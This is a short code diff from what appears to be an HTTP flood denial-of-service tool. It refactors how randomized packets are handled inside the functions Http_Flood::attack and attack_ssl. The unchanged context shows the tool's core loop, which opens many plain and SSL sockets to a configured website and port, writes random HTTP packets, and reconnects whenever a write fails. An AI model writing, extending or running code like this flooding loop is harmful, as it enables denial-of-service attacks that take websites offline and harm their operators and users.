@@ -128,8 +128,8 @@ void Http_Flood::attack(const int *id) {
             if(!sockets[x]){
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
             }
-            const char *packet = Randomizer::randomPacket(conf);
-            if((r = write_socket(sockets[x], packet, static_cast<int>(strlen(packet)))) == -1){
+            const std::string &packet = Randomizer::randomPacket(conf);
+            if((r = write_socket(sockets[x], packet.c_str(), packet.length())) == -1){
                 cleanup(&sockets[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
             }else{
@@ -167,8 +167,8 @@ void Http_Flood::attack_ssl(const int *id) {
                 CTXs[x] = InitCTX();
                 SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
             }
-            const char *packet = Randomizer::randomPacket(conf);
-            if((r = write_socket(SSLs[x], packet, static_cast<int>(strlen(packet)))) == -1){
+            const std::string &packet = Randomizer::randomPacket(conf);
+            if((r = write_socket(SSLs[x], packet.c_str(), static_cast<int>(packet.length()))) == -1){
                 cleanup(SSLs[x], &sockets[x], CTXs[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                 CTXs[x] = InitCTX();
